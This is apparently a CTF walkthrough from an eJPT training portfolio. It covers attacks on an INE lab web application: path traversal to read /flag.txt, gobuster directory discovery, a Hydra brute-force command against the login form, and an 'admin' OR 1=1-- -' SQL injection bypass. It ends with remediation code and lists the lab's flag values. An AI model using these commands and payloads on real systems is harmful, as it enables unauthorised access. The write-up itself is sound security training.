<div align="center">
  <a href="../README.md">⬅️ <b>Back to Section Hub</b></a> | <a href="../../README.md">📂 <b>eJPT Track Hub</b></a> | <a href="../../../README.md">🏠 <b>Portfolio Root</b></a>
</div>

<br>

<div align="center">
  <h1>🌐 Web Application Penetration Testing — CTF 1 🌐</h1>
  <p><b>Platform:</b> INE Security | <b>Learning Path:</b> Penetration Testing Student (eJPT v2) | <b>Course:</b> Web Application Penetration Testing: Introduction to the Web & HTTP Protocol | <b>Difficulty:</b> Easy / Medium</p>
  <p><i>Date Completed: 30 October 2026</i></p>

[![Platform - INE](https://img.shields.io/badge/Platform-INE%20Security-0078D4?style=flat-square&logo=target)](https://ine.com/)
[![Track - eJPT](https://img.shields.io/badge/Track-eJPT%20v2-orange?style=flat-square&logo=hackthebox)](../../README.md)
[![Flags - 4/4](https://img.shields.io/badge/Flags%20Captured-4%20%2F%204-success?style=flat-square&logo=checkmarx)](./README.md)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-T1190%20%7C%20T1595%20%7C%20T1110%20%7C%20T1078-red?style=flat-square)](https://attack.mitre.org/)
[![CVSS v3.1](https://img.shields.io/badge/Max%20Severity-9.8%20(Critical)-critical?style=flat-square)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
</div>

---

## 📋 Objective & Scope
> **Perform active web application penetration testing against the target web application hosted at `http://target.ine.local`. The assessment requires conducting network service discovery, identifying path traversal / local file inclusion vulnerabilities, brute-forcing hidden application directories, executing automated credential attacks against HTTP authentication forms, and exploiting SQL injection vulnerabilities to bypass authentication and capture all 4 challenge flags.**

- **Target Host:** `target.ine.local` (`192.162.243.3`)
- **Key Services Audited:** Gunicorn WSGI Python Web Server on port 80/tcp
- **Provided Assessment Artifacts & Wordlists:**
  - Wordlist 1: `/usr/share/wordlists/dirb/common.txt`
  - Wordlist 2: `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
  - Wordlist 3: `/root/Desktop/wordlists/100-common-passwords.txt`

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20115529.png" alt="INE Web Application Penetration Testing CTF 1 challenge dashboard showing target details, objectives, and wordlists" width="850px">
  <br><i>Figure 1: INE Lab Dashboard — Challenge briefing, scope requirements, wordlists, and flag capture objectives.</i>
</div>

<br>

---

## 🛠️ Tools Used
| Tool | Purpose in Assessment |
| :--- | :--- |
| **Nmap** | Initial TCP network reconnaissance, port scanning, and service version detection (`-sV -sC`). |
| **Gobuster** | High-speed directory brute-forcing utilizing `common.txt` to uncover hidden application routing endpoints (`/secured`). |
| **THC-Hydra** | High-performance multi-threaded dictionary attack engine against the HTTP POST login form (`http-post-form`). |
| **Firefox Browser** | Manual exploration, web parameter inspection, cookie/session analysis, and payload verification. |
| **cURL / HTTP Requests** | Testing REST endpoints, observing HTTP redirect codes (302/308), and examining raw JSON responses. |

<br>

---

## 🗺️ MITRE ATT&CK® Enterprise Mapping
| Tactic | Technique ID | Technique Name | Description in Assessment |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Service banner grabbing and directory enumeration using Nmap and Gobuster. |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploiting Local File Inclusion (LFI) via `/view_file?file=` and SQL Injection on `/login`. |
| **Credential Access** | `T1110.001` | Brute Force: Password Guessing | Performing dictionary attack with THC-Hydra against `/login` using SecLists wordlists. |
| **Defense Evasion / Persistence** | `T1078.003` | Valid Accounts: Local Accounts | Authenticating as legitimate user `guest` and hijacking `admin` via SQLi authentication bypass. |
| **Discovery** | `T1083` | File and Directory Discovery | Uncovering hidden `/secured/` endpoint listing restricted files in JSON format. |
| **Collection** | `T1005` | Data from Local System | Exfiltrating flag tokens directly from the host filesystem (`/flag.txt`) and user profile objects. |

<br>

---

## 🔍 1. Reconnaissance & Application Fingerprinting

### 🌐 Network Port & Service Scanning
We initiate active reconnaissance against `target.ine.local` using Nmap service version detection (`-sV`) and default NSE scripts (`-sC`):

```bash
nmap -sV -sC target.ine.local
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-30 12:01 IST
Nmap scan report for target.ine.local (192.162.243.3)
Host is up (0.000025s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: CTF Challenge - Welcome
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 30 Oct 2026 06:31:10 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 3615
|     <!DOCTYPE html>
|     <html lang="en">
|     ...[snip]...
|     <title>CTF Challenge - Welcome</title>
|     <link rel="stylesheet" href="/static/style.css">
```

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20120556.png" alt="Nmap service scan results against target.ine.local showing Gunicorn HTTP server" width="850px">
  <br><i>Figure 2: Nmap service scan results for target.ine.local — Gunicorn Python WSGI HTTP server running on port 80/tcp.</i>
</div>

### Key Reconnaissance Findings:
- **Port 80/tcp (HTTP):** Gunicorn Python WSGI server hosting a custom web application titled `CTF Challenge - Welcome`.
- **Static Assets:** Application serves static stylesheets from `/static/style.css`.
- **Application Structure:** Navigation bar reveals primary endpoints: `Home`, `Login`, and `About Us`.

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20115758.png" alt="Target homepage showing file selector dropdown and navigation menu" width="850px">
  <br><i>Figure 3: Target web application homepage at `http://target.ine.local` showing the interactive file selector.</i>
</div>

<br>

---

## ⚡ 2. Flag 1 Acquisition: Local File Inclusion / Path Traversal

**Task Prompt:**
> *"Sometimes, important files are hidden in plain sight. Check the root ('/') directory for a file named 'flag.txt' that might hold the key to the first flag."*

### Step 1: Analyzing the File Viewer Functionality
On the homepage, the application provides a dropdown menu labeled **Select a file:** with default entry `file1.txt`. Clicking the **View File** button initiates a GET request:

```text
http://target.ine.local/view_file?file=file1.txt
```

The browser renders educational content about application attacks (path traversal, XSS, SQLi, CSRF, IDOR).

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20121102.png" alt="Web application file viewer displaying content from file1.txt" width="850px">
  <br><i>Figure 4: Interacting with `/view_file?file=file1.txt` — identifying parameter `file` as a potential input vector.</i>
</div>

<br>

### Step 2: Path Traversal & Flag Retrieval
The challenge prompt explicitly instructs checking the root directory (`/`) for a file named `flag.txt`. 

Because parameter `file` directly concatenates or opens the file from the filesystem without path sanitization or restriction to a dedicated directory, we test passing an absolute path:

```text
http://target.ine.local/view_file?file=/flag.txt
```

The backend reads `/flag.txt` from the server root and renders its contents directly inside the File Viewer box:

```text
FLAG1_7fe74dd9a73c4756a7babde1216537b1
```

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20122715.png" alt="File viewer reading /flag.txt displaying Flag 1" width="850px">
  <br><i>Figure 5: Arbitrary file retrieval via `view_file?file=/flag.txt` extracting Flag 1.</i>
</div>

```text
FLAG1_7fe74dd9a73c4756a7babde1216537b1
```
- **Submitted Hash / Value:** `7fe74dd9a73c4756a7babde1216537b1` (or token `FLAG1_7fe74dd9a73c4756a7babde1216537b1`)

<br>

---

## ⚡ 3. Flag 2 Acquisition: Directory Enumeration & Sensitive File Exposure

**Task Prompt:**
> *"Explore the structure of the server's directories. Enumeration might reveal hidden treasures."*

### Step 1: Web Directory Fuzzing with Gobuster
To uncover hidden application routes and unlinked files, we run Gobuster using the lab-provided dictionary `/usr/share/wordlists/dirb/common.txt`:

```bash
gobuster dir -u http://target.ine.local -w /usr/share/wordlists/dirb/common.txt
```

```text
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.ine.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2858]
/login                (Status: 200) [Size: 3377]
/logout               (Status: 302) [Size: 189] [--> /]
/secured              (Status: 308) [Size: 251] [--> http://target.ine.local/secured/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20122803.png" alt="Gobuster directory brute force results revealing /secured" width="850px">
  <br><i>Figure 6: Gobuster directory brute-forcing discovering endpoints `/about`, `/login`, `/logout`, and `/secured`.</i>
</div>

<br>

### Step 2: Inspecting the `/secured/` Endpoint
The permanent redirect `/secured` (Status 308) indicates a hidden sub-route. We navigate to `http://target.ine.local/secured/` in Firefox:

The server responds with a JSON array disclosing exposed files:
```json
[
  "flag.txt"
]
```

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20122846.png" alt="Firefox viewing /secured/ returning JSON array with flag.txt" width="850px">
  <br><i>Figure 7: Accessing `http://target.ine.local/secured/` revealing sensitive directory listing containing `flag.txt`.</i>
</div>

<br>

### Step 3: Flag 2 Retrieval
We request `http://target.ine.local/secured/flag.txt` directly:

```text
http://target.ine.local/secured/flag.txt
```

The browser renders the raw text content of the flag:

```text
FLAG2_0e3bc2956f4846e2b133dcd8ca33d985
```

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20122925.png" alt="Reading /secured/flag.txt displaying Flag 2" width="850px">
  <br><i>Figure 8: Direct retrieval of `http://target.ine.local/secured/flag.txt` extracting Flag 2.</i>
</div>

```text
FLAG2_0e3bc2956f4846e2b133dcd8ca33d985
```
- **Submitted Hash / Value:** `0e3bc2956f4846e2b133dcd8ca33d985` (or token `FLAG2_0e3bc2956f4846e2b133dcd8ca33d985`)

<br>

---

## ⚡ 4. Flag 3 Acquisition: Web Form Credential Brute-Force (THC-Hydra)

**Task Prompt:**
> *"The login form seems a bit weak. Trying out different combinations might just reveal the next flag."*

### Step 1: Inspecting the Login Interface
We navigate to `http://target.ine.local/login`:
- The page presents a standard authentication form with inputs `Username:` and `Password:`.
- An invalid credential submission returns: `Invalid username or password`.

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20123020.png" alt="CTF Challenge login portal at target.ine.local/login" width="850px">
  <br><i>Figure 9: Web login form at `http://target.ine.local/login`.</i>
</div>

<br>

### Step 2: Executing THC-Hydra HTTP POST Form Attack
We utilize THC-Hydra to perform a dictionary attack against `/login` using the two wordlists specified in the lab instructions:
- **Usernames:** `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` (17 users)
- **Passwords:** `/root/Desktop/wordlists/100-common-passwords.txt` (100 passwords)
- **Form Path & Failure String:** `"/login:username=^USER^&password=^PASS^:F=Invalid username or password"`

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /root/Desktop/wordlists/100-common-passwords.txt \
      target.ine.local http-post-form \
      "/login:username=^USER^&password=^PASS^:F=Invalid username or password" \
      -t 4 -V
```

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20123117.png" alt="THC-Hydra launching HTTP POST form attack against target login" width="850px">
  <br><i>Figure 10: THC-Hydra actively testing username/password permutations against the `/login` endpoint.</i>
</div>

<br>

Hydra successfully discovers a valid credential combination:

```text
[80][http-post-form] host: target.ine.local   login: guest   password: butterfly1
1 of 1 target successfully completed, 1 valid password found
```

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20123154.png" alt="THC-Hydra cracking login credentials guest:butterfly1" width="850px">
  <br><i>Figure 11: THC-Hydra successfully cracking credentials for account `guest:butterfly1`.</i>
</div>

<br>

### Step 3: Authenticated Session & Flag 3 Extraction
We return to Firefox and log in with the cracked credentials:
- **Username:** `guest`
- **Password:** `butterfly1`

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20123237.png" alt="Logging in with credentials guest and butterfly1" width="850px">
  <br><i>Figure 12: Submitting cracked credentials `guest:butterfly1` into the login interface.</i>
</div>

<br>

Upon successful authentication, the application redirects to the user's profile view:
```text
http://target.ine.local/profile/2?name=Bob+Guest
```

The profile renders the account details:
- **Username:** `guest`
- **Name:** `Bob Guest`
- **Mobile:** `9876543810`
- **Address:** `456 Adam St, NY`
- **Secret String:** `FLAG3_5935ae6908594deea9c798992b3a35d6`

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20123313.png" alt="User profile page for guest disclosing Flag 3 in Secret String" width="850px">
  <br><i>Figure 13: Authenticated user profile for `guest` displaying Flag 3 in the Secret String field.</i>
</div>

```text
FLAG3_5935ae6908594deea9c798992b3a35d6
```
- **Submitted Hash / Value:** `5935ae6908594deea9c798992b3a35d6` (or token `FLAG3_5935ae6908594deea9c798992b3a35d6`)

<br>

---

## ⚡ 5. Flag 4 Acquisition: SQL Injection Authentication Bypass

**Task Prompt:**
> *"The login form behaves oddly with unexpected inputs. Think of injection techniques to access the 'admin' account and find the flag."*

### Step 1: Vulnerability Analysis
The prompt points out that the login form handles unexpected inputs improperly and instructs using injection techniques to compromise the `admin` account.

In traditional SQL-backed web applications, user authentication is verified with a query resembling:
```sql
SELECT * FROM users WHERE username = '<USER_INPUT>' AND password = '<PASSWORD_INPUT>';
```

If user input is concatenated directly without parameterization, submitting an injection payload into the username field can alter the SQL logic:
- Input: `admin' OR 1=1-- -`
- Resulting Query:
  ```sql
  SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '...';
  ```
The statement checks if `username = 'admin'` (or evaluates `1=1`), and the comment syntax (`-- -`) ignores the password verification clause altogether.

<br>

### Step 2: Exploiting SQLi on `/login`
We log out of the `guest` session and input the SQL injection payload into the login form:
- **Username:** `admin' OR 1=1-- -`
- **Password:** `password` (any arbitrary value)

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20123430.png" alt="Submitting SQL injection payload admin' OR 1=1-- - into login form" width="850px">
  <br><i>Figure 14: Submitting SQL injection authentication bypass payload `admin' OR 1=1-- -`.</i>
</div>

<br>

### Step 3: Admin Profile & Flag 4 Retrieval
The application accepts the bypass, identifies the session as the primary administrator (`User ID: 1`), and redirects to:
```text
http://target.ine.local/profile/1?name=Admin+Account
```

The administrative profile displays:
- **Username:** `admin`
- **Name:** `Admin Account`
- **Mobile:** `8876743810`
- **Address:** `56 Admin St, NY`
- **Secret String:** `FLAG4_f24ce7977d5a4e60a84fe7239b02adba`

<div align="center">
  <img src="./images/Screenshot%202026-10-30%20123514.png" alt="Admin profile page displaying Flag 4 in Secret String" width="850px">
  <br><i>Figure 15: Bypassing authentication to view Admin Account profile (`/profile/1`) displaying Flag 4.</i>
</div>

```text
FLAG4_f24ce7977d5a4e60a84fe7239b02adba
```
- **Submitted Hash / Value:** `f24ce7977d5a4e60a84fe7239b02adba` (or token `FLAG4_f24ce7977d5a4e60a84fe7239b02adba`)

<br>

---

## 🏁 3. Flags Summary

| Flag # | Challenge Prompt / Task | Flag Value | Source / Methodology |
| :---: | :--- | :--- | :--- |
| **Flag 1** | Sometimes, important files are hidden in plain sight. Check the root ('/') directory for a file named 'flag.txt' that might hold the key to the first flag. | `7fe74dd9a73c4756a7babde1216537b1` | Local File Inclusion / Path Traversal: `http://target.ine.local/view_file?file=/flag.txt` |
| **Flag 2** | Explore the structure of the server's directories. Enumeration might reveal hidden treasures. | `0e3bc2956f4846e2b133dcd8ca33d985` | Gobuster directory brute-force (`common.txt`) -> `/secured/` JSON listing -> `http://target.ine.local/secured/flag.txt` |
| **Flag 3** | The login form seems a bit weak. Trying out different combinations might just reveal the next flag. | `5935ae6908594deea9c798992b3a35d6` | THC-Hydra HTTP POST form attack -> `guest:butterfly1` -> `/profile/2` Secret String |
| **Flag 4** | The login form behaves oddly with unexpected inputs. Think of injection techniques to access the 'admin' account and find the flag. | `f24ce7977d5a4e60a84fe7239b02adba` | SQL Injection authentication bypass (`admin' OR 1=1-- -`) on `/login` -> `/profile/1` Secret String |

<br>

---

## 🛡️ 4. Vulnerability Risk Ratings & Defensive Hardening

### 📊 CVSS v3.1 Findings Matrix
| Finding | Severity | CVSS v3.1 Score | Vector String |
| :--- | :---: | :---: | :--- |
| **SQL Injection Authentication Bypass (`/login`)** | 🔴 **Critical** | **9.8** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Arbitrary Local File Inclusion / Path Traversal (`/view_file`)** | 🔴 **High** | **7.5** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Sensitive File & Directory Exposure (`/secured/`)** | 🟡 **Medium** | **5.3** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Weak Password Policy & Absence of Rate Limiting on Login** | 🟡 **Medium** | **5.3** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |

<br>

<details>
<summary><b>Click to expand enterprise remediation strategies & hardening guidelines</b></summary>
<br>

### 1. Remediating SQL Injection (OWASP Top 10 A03:2021)
- **Root Cause:** The authentication backend directly concatenated user-supplied input strings into raw SQL execution calls without parameterization or prepared statements.
- **Remediation:**
  1. Utilize parameterized queries / prepared statements with ORM frameworks (e.g., SQLAlchemy) or database drivers:
     ```python
     # Secure parameterized query in Python/sqlite3
     cursor.execute(
         "SELECT id, username FROM users WHERE username = ? AND password = ?",
         (username, hashed_password)
     )
     user = cursor.fetchone()
     ```
  2. Hash stored passwords using robust, slow cryptographic hashing algorithms with salts (`bcrypt`, `argon2id`, or `PBKDF2`).

### 2. Preventing Path Traversal / Local File Inclusion (OWASP Top 10 A01:2021)
- **Root Cause:** The `/view_file` route accepted arbitrary filesystem paths via parameter `file` without validating against a whitelist or restricting the canonical directory path.
- **Remediation:**
  1. Enforce strict file whitelisting or resolve canonical paths using `os.path.commonpath` / `os.path.realpath`:
     ```python
     import os
     from flask import abort

     BASE_DIR = os.path.abspath("/var/www/allowed_files")

     def safe_read_file(filename):
         requested_path = os.path.abspath(os.path.join(BASE_DIR, filename))
         # Verify the requested path remains strictly within the intended base directory
         if os.path.commonpath([BASE_DIR, requested_path]) != BASE_DIR:
             abort(403) # Path traversal attempt detected
         if not os.path.isfile(requested_path):
             abort(404)
         with open(requested_path, "r") as f:
             return f.read()
     ```

### 3. Securing Sensitive Endpoints & Enforcing Access Control
- **Root Cause:** The `/secured/` endpoint was unauthenticated and indexed sensitive files directly to the public web.
- **Remediation:**
  1. Implement strict role-based access control (RBAC) middleware verifying session tokens before serving sensitive directories.
  2. Disable public directory listings and store internal files outside the web server root.

### 4. Mitigating Credential Brute-Force Attacks
- **Root Cause:** The `/login` endpoint lacked account lockout mechanisms, CAPTCHA challenges, or IP-based rate limiting.
- **Remediation:**
  1. Implement rate limiting on sensitive routes using tools such as **Flask-Limiter** or Nginx `limit_req_zone`:
     ```python
     from flask_limiter import Limiter
     from flask_limiter.util import get_remote_address

     limiter = Limiter(get_remote_address, app=app)

     @app.route("/login", methods=["POST"])
     @limiter.limit("5 per minute")
     def login():
         # Authentication logic
         pass
     ```
  2. Implement temporary account lockout or progressive delays after multiple consecutive failed attempts.

</details>

<br>

---

## 💡 5. Key Learnings & Takeaways
- **Input Validation is Fundamental:** Both Flag 1 (Path Traversal) and Flag 4 (SQL Injection) stem from trust placed in unvalidated user input, demonstrating that input sanitization and parameterized queries are critical defense pillars.
- **Hidden Routes Offer False Security:** Obscurity is not security; automated directory enumeration tools (`gobuster`) quickly surface unlinked paths like `/secured` within seconds.
- **Dictionary Attacks Bypass Weak Passwords in Seconds:** Generic accounts like `guest` using weak passwords (`butterfly1`) are effortlessly uncovered by THC-Hydra against default wordlists.
- **Comprehensive Web Assessment Workflow:** Progressing systematically through reconnaissance, content fuzzing, parameter tampering, online password attacks, and injection flaws demonstrates the core offensive web application testing methodology required for the eJPT certification.

---
<div align="center">
  <i>Walkthrough documented on 30 October 2026. Part of the INE eJPT Certification Journey.</i>
</div>
